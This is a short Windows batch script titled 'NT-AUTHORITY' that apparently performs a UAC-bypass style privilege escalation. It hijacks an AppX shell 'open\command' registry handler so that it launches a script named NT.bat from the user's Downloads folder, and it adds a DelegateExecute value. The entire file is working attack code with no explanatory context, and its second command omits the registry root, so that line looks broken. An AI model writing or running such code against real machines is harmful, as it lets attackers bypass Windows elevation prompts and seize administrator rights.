@echo off
echo.
echo ### NT-AUTHORITY ###
reg.exe add hkcu\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command /ve /d "%USERPROFILE%\Downloads\NT.bat" /f
reg.exe add Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command /v "DelegateExecute" /f